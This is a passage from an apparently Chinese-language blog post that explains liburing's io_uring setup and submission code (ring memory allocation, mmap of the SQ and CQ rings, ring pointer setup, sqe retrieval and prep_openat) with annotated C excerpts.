完成真正的初始化操作了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fd = __sys_io_uring_setup(entries, p);</span><br><span class="line"><span class="comment">// syscall(__NR_io_uring_setup, entries, p)</span></span><br><span class="line"><span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> ((p-&gt;flags &amp; IORING_SETUP_NO_MMAP) &amp;&amp;</span><br><span class="line">    !(ring-&gt;int_flags &amp; INT_FLAG_APP_MEM)) &#123;</span><br><span class="line">__sys_munmap(ring-&gt;sq.sqes, <span class="number">1</span>);</span><br><span class="line">io_uring_unmap_rings(&amp;ring-&gt;sq, &amp;ring-&gt;cq);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> fd;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 错误处理</span></span><br></pre></td></tr></table></figure><p>对于没有设置 NO_MMAP 的情形，需要在此时mmap为sq和cq在用户态映射内存[[#io_uring_queue_mmap]]，反之，直接设置ring相关指针[[#io_uring_setup_ring_pointers]]</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!(p-&gt;flags &amp; IORING_SETUP_NO_MMAP)) &#123;</span><br><span class="line">ret = io_uring_queue_mmap(fd, p, ring);</span><br><span class="line"><span class="keyword">if</span> (ret) &#123;</span><br><span class="line">__sys_close(fd);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">io_uring_setup_ring_pointers(p, &amp;ring-&gt;sq, &amp;ring-&gt;cq);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后，是将<code>io_uring_setup</code> 设置在 params 中的各种变量复制到用户态管理结构体ring中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">sq_entries = ring-&gt;sq.ring_entries;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(p-&gt;flags &amp; IORING_SETUP_NO_SQARRAY)) &#123;</span><br><span class="line">sq_array = ring-&gt;sq.<span class="built_in">array</span>;</span><br><span class="line"><span class="keyword">for</span> (index = <span class="number">0</span>; index &lt; sq_entries; index++)</span><br><span class="line">sq_array[index] = index;</span><br><span class="line">&#125;</span><br><span class="line">ring-&gt;features = p-&gt;features;</span><br><span class="line"><span class="comment">// io_uring 的 特性</span></span><br><span class="line">ring-&gt;flags = p-&gt;flags;</span><br><span class="line"><span class="comment">// io_uring 设置的标志</span></span><br><span class="line">ring-&gt;enter_ring_fd = fd;</span><br><span class="line"><span class="comment">// 返回的fd</span></span><br><span class="line"><span class="keyword">if</span> (p-&gt;flags &amp; IORING_SETUP_REGISTERED_FD_ONLY) &#123;</span><br><span class="line">ring-&gt;ring_fd = <span class="number">-1</span>;</span><br><span class="line">ring-&gt;int_flags |= INT_FLAG_REG_RING | INT_FLAG_REG_REG_RING;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">ring-&gt;ring_fd = fd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="io-uring-alloc-huge"><code>io_uring_alloc_huge</code></h4><p><code>io_uring_alloc_huge</code> 是对于设置了NO_MMAP的程序，预先在用户态设置好SQ和CQ的内存的函数</p><p>首先是会用到的各种参数和变量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">io_uring_alloc_huge</span><span class="params">(<span class="type">unsigned</span> entries, <span class="keyword">struct</span> io_uring_params *p,</span></span><br><span class="line"><span class="params">       <span class="keyword">struct</span> io_uring_sq *sq, <span class="keyword">struct</span> io_uring_cq *cq,</span></span><br><span class="line"><span class="params">       <span class="type">void</span> *buf, <span class="type">size_t</span> buf_size)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> page_size = get_page_size();</span><br><span class="line"><span class="type">unsigned</span> sq_entries, cq_entries;</span><br><span class="line"><span class="type">size_t</span> ring_mem, sqes_mem;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> mem_used = <span class="number">0</span>;</span><br><span class="line"><span class="type">void</span> *ptr;</span><br><span class="line"><span class="type">int</span> ret;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接下来是首先确定了sq和eq entrie的数量。这里具体的算法就不在这里分析了，主要包括合法性检查和幂2向上取整的运算等。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ret = get_sq_cq_entries(entries, p, &amp;sq_entries, &amp;cq_entries);</span><br><span class="line"><span class="keyword">if</span> (ret)</span><br><span class="line"><span class="keyword">return</span> ret;</span><br></pre></td></tr></table></figure><p>接下来就是计算sq和cq需要的内存大小了，计算过程非常直观，笔者就不赘述了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sqes_mem = sq_entries * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> io_uring_sqe);</span><br><span class="line">sqes_mem = (sqes_mem + page_size - <span class="number">1</span>) &amp; ~(page_size - <span class="number">1</span>);</span><br><span class="line">ring_mem = cq_entries * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> io_uring_cqe);</span><br><span class="line"><span class="keyword">if</span> (p-&gt;flags &amp; IORING_SETUP_CQE32)</span><br><span class="line">ring_mem *= <span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span> (!(p-&gt;flags &amp; IORING_SETUP_NO_SQARRAY))</span><br><span class="line">ring_mem += sq_entries * <span class="keyword">sizeof</span>(<span class="type">unsigned</span>);</span><br><span class="line">mem_used = sqes_mem + ring_mem;</span><br><span class="line">mem_used = (mem_used + page_size - <span class="number">1</span>) &amp; ~(page_size - <span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>接下来，就是真正决定sq和cq的用户态地址了。</p><p>首先，如果用户传入了buf，并且buf_size足够大， 那么就设置为用户buf</p><p>否则，就mmap出一片内存来使用（根据size计算的不同可能是4K也可能是4M，分别是一页和一个大页(二级页表对应的大小)）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!buf &amp;&amp; (sqes_mem &gt; huge_page_size || ring_mem &gt; huge_page_size))</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (buf) &#123;</span><br><span class="line"><span class="keyword">if</span> (mem_used &gt; buf_size)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line">ptr = buf;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="type">int</span> map_hugetlb = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (sqes_mem &lt;= page_size)</span><br><span class="line">buf_size = page_size;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">buf_size = huge_page_size;</span><br><span class="line">map_hugetlb = MAP_HUGETLB;</span><br><span class="line">&#125;</span><br><span class="line">ptr = __sys_mmap(<span class="literal">NULL</span>, buf_size, PROT_READ|PROT_WRITE,</span><br><span class="line">MAP_SHARED|MAP_ANONYMOUS|map_hugetlb,</span><br><span class="line"><span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(ptr))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(ptr);</span><br><span class="line">&#125;</span><br><span class="line">sq-&gt;sqes = ptr;</span><br></pre></td></tr></table></figure><p>并以类似的方式设置了<code>sq-&gt;ring_ptr</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> (mem_used &lt;= buf_size)</span><br><span class="line">&#123;</span><br><span class="line">sq-&gt;ring_ptr = (<span class="type">void</span> *)sq-&gt;sqes + sqes_mem;</span><br><span class="line"><span class="comment">/* clear ring sizes, we have just one mmap() to undo */</span></span><br><span class="line">cq-&gt;ring_sz = <span class="number">0</span>;</span><br><span class="line">sq-&gt;ring_sz = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> map_hugetlb = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (ring_mem &lt;= page_size)</span><br><span class="line">buf_size = page_size;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">buf_size = huge_page_size;</span><br><span class="line">map_hugetlb = MAP_HUGETLB;</span><br><span class="line">&#125;</span><br><span class="line">ptr = __sys_mmap(<span class="literal">NULL</span>, buf_size, PROT_READ | PROT_WRITE,</span><br><span class="line"> MAP_SHARED | MAP_ANONYMOUS | map_hugetlb,</span><br><span class="line"> <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(ptr))</span><br><span class="line">&#123;</span><br><span class="line">__sys_munmap(sq-&gt;sqes, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(ptr);</span><br><span class="line">&#125;</span><br><span class="line">sq-&gt;ring_ptr = ptr;</span><br><span class="line">sq-&gt;ring_sz = buf_size;</span><br><span class="line">cq-&gt;ring_sz = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不过下面一部分就是真正重要的了：</p><p>p正是传入 <code>io_uring_setup</code> 的结构体，所以对p的赋值才是至关重要的，这里的sq和cq不过是 <code>liburing</code>  暴露给用户的管理结构 <code>io_uring</code> 中的一个成员</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cq-&gt;ring_ptr = (<span class="type">void</span> *)sq-&gt;ring_ptr;</span><br><span class="line">p-&gt;sq_off.user_addr = (<span class="type">unsigned</span> <span class="type">long</span>)sq-&gt;sqes;</span><br><span class="line">p-&gt;cq_off.user_addr = (<span class="type">unsigned</span> <span class="type">long</span>)sq-&gt;ring_ptr;</span><br><span class="line"><span class="keyword">return</span> (<span class="type">int</span>)mem_used;</span><br></pre></td></tr></table></figure><p>所以规根结底就是写入了 p的 sq_off 和 cq_off</p><h4 id="io-uring-queue-mmap"><code>io_uring_queue_mmap</code></h4><p>这是对于没有设置NO_MMAP的情形下，完成了 syscall <code>io_uring_setup</code> 处理后，mmap的流程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__cold <span class="type">int</span> <span class="title function_">io_uring_queue_mmap</span><span class="params">(<span class="type">int</span> fd, <span class="keyword">struct</span> io_uring_params *p,</span></span><br><span class="line"><span class="params">   <span class="keyword">struct</span> io_uring *ring)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">memset</span>(ring, <span class="number">0</span>, <span class="keyword">sizeof</span>(*ring));</span><br><span class="line"><span class="keyword">return</span> io_uring_mmap(fd, p, &amp;ring-&gt;sq, &amp;ring-&gt;cq);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先是计算了sq和cq的ring的size</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">io_uring_mmap</span><span class="params">(<span class="type">int</span> fd, <span class="keyword">struct</span> io_uring_params *p,</span></span><br><span class="line"><span class="params"> <span class="keyword">struct</span> io_uring_sq *sq, <span class="keyword">struct</span> io_uring_cq *cq)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">size_t</span> size;</span><br><span class="line"><span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">size = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> io_uring_cqe);</span><br><span class="line"><span class="keyword">if</span> (p-&gt;flags &amp; IORING_SETUP_CQE32)</span><br><span class="line">size += <span class="keyword">sizeof</span>(<span class="keyword">struct</span> io_uring_cqe);</span><br><span class="line"></span><br><span class="line">sq-&gt;ring_sz = p-&gt;sq_off.<span class="built_in">array</span> + p-&gt;sq_entries * <span class="keyword">sizeof</span>(<span class="type">unsigned</span>);</span><br><span class="line">cq-&gt;ring_sz = p-&gt;cq_off.cqes + p-&gt;cq_entries * size;</span><br></pre></td></tr></table></figure><p>然后开始mmap sq 和 cq ring的指针：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (p-&gt;features &amp; IORING_FEAT_SINGLE_MMAP)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (cq-&gt;ring_sz &gt; sq-&gt;ring_sz)</span><br><span class="line">sq-&gt;ring_sz = cq-&gt;ring_sz;</span><br><span class="line">cq-&gt;ring_sz = sq-&gt;ring_sz;</span><br><span class="line">&#125;</span><br><span class="line">sq-&gt;ring_ptr = __sys_mmap(<span class="number">0</span>, sq-&gt;ring_sz, PROT_READ | PROT_WRITE,</span><br><span class="line">  MAP_SHARED | MAP_POPULATE, fd,</span><br><span class="line">  IORING_OFF_SQ_RING);<span class="comment">// offset = 0</span></span><br><span class="line"><span class="keyword">if</span> (IS_ERR(sq-&gt;ring_ptr))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(sq-&gt;ring_ptr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (p-&gt;features &amp; IORING_FEAT_SINGLE_MMAP)</span><br><span class="line">&#123;</span><br><span class="line">cq-&gt;ring_ptr = sq-&gt;ring_ptr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">cq-&gt;ring_ptr = __sys_mmap(<span class="number">0</span>, cq-&gt;ring_sz, PROT_READ | PROT_WRITE,</span><br><span class="line">  MAP_SHARED | MAP_POPULATE, fd,</span><br><span class="line">  IORING_OFF_CQ_RING);</span><br><span class="line">  <span class="comment">// offset = 8000000 </span></span><br><span class="line"><span class="keyword">if</span> (IS_ERR(cq-&gt;ring_ptr))</span><br><span class="line">&#123;</span><br><span class="line">ret = PTR_ERR(cq-&gt;ring_ptr);</span><br><span class="line">cq-&gt;ring_ptr = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">goto</span> err;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果设置了 <code>IORING_FEAT_SINGLE_MMAP</code> ，就可以将sq 和 cq的ring一起mmap，否则，就分别单独mmap</p><p>最后再mmap sq的sqes</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">size = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> io_uring_sqe);</span><br><span class="line"><span class="keyword">if</span> (p-&gt;flags &amp; IORING_SETUP_SQE128)</span><br><span class="line">size += <span class="number">64</span>;</span><br><span class="line">sq-&gt;sqes = __sys_mmap(<span class="number">0</span>, size * p-&gt;sq_entries, PROT_READ | PROT_WRITE,</span><br><span class="line">  MAP_SHARED | MAP_POPULATE, fd, IORING_OFF_SQES);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(sq-&gt;sqes))</span><br><span class="line">&#123;</span><br><span class="line">ret = PTR_ERR(sq-&gt;sqes);</span><br><span class="line">err:</span><br><span class="line">io_uring_unmap_rings(sq, cq);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后的最后，设置相关指针 [[#io_uring_setup_ring_pointers]]</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">io_uring_setup_ring_pointers(p, sq, cq);</span><br></pre></td></tr></table></figure><h4 id="io-uring-setup-ring-pointers">io_uring_setup_ring_pointers</h4><p>此函数用来设置 <code>struct io_uring ring</code>  也就是liburing的核心管理结构体.</p><p>我们知道 <code>sq-&gt;ring_ptr</code> 在 kernel被映射到一个内核结构体, 其中结构体各个成员的偏移通过 <code>io_uring_params</code>  的两个 <code>offset</code> 成员结构体返回, 这里通过此拿到结构体对应成员的指针, 并赋值给 <code>sq</code> 和 <code>cq</code> 的各个成员, 这里的 <code>sq</code> 和 <code>cq</code> 又是 管理结构体 <code>ring</code> 的成员</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">io_uring_setup_ring_pointers</span><span class="params">(<span class="keyword">struct</span> io_uring_params *p,</span></span><br><span class="line"><span class="params"> <span class="keyword">struct</span> io_uring_sq *sq,</span></span><br><span class="line"><span class="params"> <span class="keyword">struct</span> io_uring_cq *cq)</span></span><br><span class="line">&#123;</span><br><span class="line">sq-&gt;khead = sq-&gt;ring_ptr + p-&gt;sq_off.head;</span><br><span class="line"><span class="comment">// 设置sq head的指针</span></span><br><span class="line">sq-&gt;ktail = sq-&gt;ring_ptr + p-&gt;sq_off.tail;</span><br><span class="line"><span class="comment">// 设置sq tail指针</span></span><br><span class="line">sq-&gt;kring_mask = sq-&gt;ring_ptr + p-&gt;sq_off.ring_mask;</span><br><span class="line">sq-&gt;kring_entries = sq-&gt;ring_ptr + p-&gt;sq_off.ring_entries;</span><br><span class="line"><span class="comment">// 设置sq entries个数</span></span><br><span class="line">sq-&gt;kflags = sq-&gt;ring_ptr + p-&gt;sq_off.flags;</span><br><span class="line"><span class="comment">// 设置对应标志</span></span><br><span class="line">sq-&gt;kdropped = sq-&gt;ring_ptr + p-&gt;sq_off.dropped;</span><br><span class="line"><span class="keyword">if</span> (!(p-&gt;flags &amp; IORING_SETUP_NO_SQARRAY))</span><br><span class="line">sq-&gt;<span class="built_in">array</span> = sq-&gt;ring_ptr + p-&gt;sq_off.<span class="built_in">array</span>;</span><br><span class="line"><span class="comment">// 如果存在sqarray</span></span><br><span class="line">cq-&gt;khead = cq-&gt;ring_ptr + p-&gt;cq_off.head;</span><br><span class="line"><span class="comment">// 设置cq head指针</span></span><br><span class="line">cq-&gt;ktail = cq-&gt;ring_ptr + p-&gt;cq_off.tail;</span><br><span class="line"><span class="comment">// 设置cq tail指针</span></span><br><span class="line">cq-&gt;kring_mask = cq-&gt;ring_ptr + p-&gt;cq_off.ring_mask;</span><br><span class="line">cq-&gt;kring_entries = cq-&gt;ring_ptr + p-&gt;cq_off.ring_entries;</span><br><span class="line">cq-&gt;koverflow = cq-&gt;ring_ptr + p-&gt;cq_off.overflow;</span><br><span class="line">cq-&gt;cqes = cq-&gt;ring_ptr + p-&gt;cq_off.cqes;</span><br><span class="line"><span class="keyword">if</span> (p-&gt;cq_off.flags)</span><br><span class="line">cq-&gt;kflags = cq-&gt;ring_ptr + p-&gt;cq_off.flags;</span><br><span class="line"></span><br><span class="line">sq-&gt;ring_mask = *sq-&gt;kring_mask;</span><br><span class="line">sq-&gt;ring_entries = *sq-&gt;kring_entries;</span><br><span class="line">cq-&gt;ring_mask = *cq-&gt;kring_mask;</span><br><span class="line">cq-&gt;ring_entries = *cq-&gt;kring_entries;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="io-uring-get-sqe"><code>io_uring_get_sqe</code></h3><p>此函数用来获取一个可用 <code>sqe</code> 用来提交任务，最终是调用了  <code>_io_uring_get_sqe</code>， 整个函数用非常优雅的方式实现了循环队列// #Elegant</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">IOURINGINLINE <span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sqe</span> *_<span class="title">io_uring_get_sqe</span>(<span class="keyword">struct</span> <span class="title">io_uring</span> *<span class="title">ring</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sq</span> *<span class="title">sq</span> =</span> &amp;ring-&gt;sq;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> head, next = sq-&gt;sqe_tail + <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> shift = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ring-&gt;flags &amp; IORING_SETUP_SQE128)</span><br><span class="line">shift = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (!(ring-&gt;flags &amp; IORING_SETUP_SQPOLL))</span><br><span class="line">head = IO_URING_READ_ONCE(*sq-&gt;khead);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">head = io_uring_smp_load_acquire(sq-&gt;khead);</span><br><span class="line"><span class="comment">// 通过原子读获取head</span></span><br><span class="line"><span class="comment">// sq-&gt;khead = sq-&gt;ring_ptr + p-&gt;sq_off.head;</span></span><br><span class="line"><span class="comment">// 这里实际上读的是共享内存的一个指针内存的 uint 值</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (next - head &lt;= sq-&gt;ring_entries) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sqe</span> *<span class="title">sqe</span>;</span></span><br><span class="line"></span><br><span class="line">sqe = &amp;sq-&gt;sqes[(sq-&gt;sqe_tail &amp; sq-&gt;ring_mask) &lt;&lt; shift];</span><br><span class="line"><span class="comment">// sq-&gt;ring_mask 来自kernel 设置的params </span></span><br><span class="line"><span class="comment">// rings-&gt;sq_ring_mask = p-&gt;sq_entries - 1;</span></span><br><span class="line"><span class="comment">// 由于sq_entries 为2的幂次倍</span></span><br><span class="line"><span class="comment">// 这里实际上就是一个循环队列的访问，</span></span><br><span class="line">sq-&gt;sqe_tail = next;</span><br><span class="line"><span class="keyword">return</span> sqe;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="io-uring-prep-xxx"><code>io_uring_prep_xxx</code></h3><p>这是一个系列函数, 用来实现 <code>io_uring</code>  提供的各种 io操作, 其根本实现是 设置 一个 <code>sqe</code> 结构体(这个结构体是内核的API),</p><p>这里以 <code>io_uring_prep_openat</code> 为例</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">IOURINGINLINE <span class="type">void</span> <span class="title function_">io_uring_prep_openat</span><span class="params">(<span class="keyword">struct</span> io_uring_sqe *sqe, <span class="type">int</span> dfd,</span></span><br><span class="line"><span class="params"><span class="type">const</span> <span class="type">char</span> *path, <span class="type">int</span> flags,</span></span><br><span class="line"><span class="params"><span class="type">mode_t</span> mode)</span></span><br><span class="line">&#123;</span><br><span class="line">io_uring_prep_rw(IORING_OP_OPENAT, sqe, dfd, path, mode, <span class="number">0</span>);</span><br><span class="line">sqe-&gt;open_flags = (__u32) flags;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">IOURINGINLINE <span class="type">void</span> <span class="title function_">io_uring_prep_rw</span><span class="params">(<span class="type">int</span> op, <span class="keyword">struct</span> io_uring_sqe *sqe, <span class="type">int</span> fd,</span></span><br><span class="line"><span class="params">    <span class="type">const</span> <span class="type">void</span> *addr, <span class="type">unsigned</span> len,</span></span><br><span class="line"><span class="params">    __u64 offset)</span></span><br><span class="line">&#123;</span><br><span class="line">sqe-&gt;opcode = (__u8) op;</span><br><span class="line"><span class="comment">// 设置op为 open</span></span><br><span class="line">sqe-&gt;flags = <span class="number">0</span></span><br><span class="line">sqe-&gt;ioprio = <span class="number">0</span>;</span><br><span class="line">sqe-&gt;fd = fd;</span><br><span class="line"><span class="comment">// 提供表示dir 的 -100 fd</span></span><br><span class="line">sqe-&gt;off = offset;</span><br><span 